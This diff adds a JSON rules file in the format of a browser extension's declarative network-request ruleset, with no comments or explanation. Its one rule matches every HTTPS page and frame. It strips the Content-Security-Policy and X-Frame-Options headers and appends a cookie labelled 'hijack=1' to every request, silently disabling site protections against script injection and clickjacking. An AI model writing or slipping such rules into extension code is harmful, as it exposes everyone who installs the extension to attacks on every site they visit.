@@ -1,0 +1,20 @@
+[
+  {
+    "id": 1,
+    "priority": 1,
+    "action": {
+      "type": "modifyHeaders",
+      "responseHeaders": [
+        { "header": "Content-Security-Policy", "operation": "remove" },
+        { "header": "X-Frame-Options", "operation": "remove" }
+      ],
+      "requestHeaders": [
+        { "header": "Cookie", "operation": "append", "value": "hijack=1" }
+      ]
+    },
+    "condition": {
+      "urlFilter": "|https://*",
+      "resourceTypes": ["main_frame", "sub_frame"]
+    }
+  }
+]
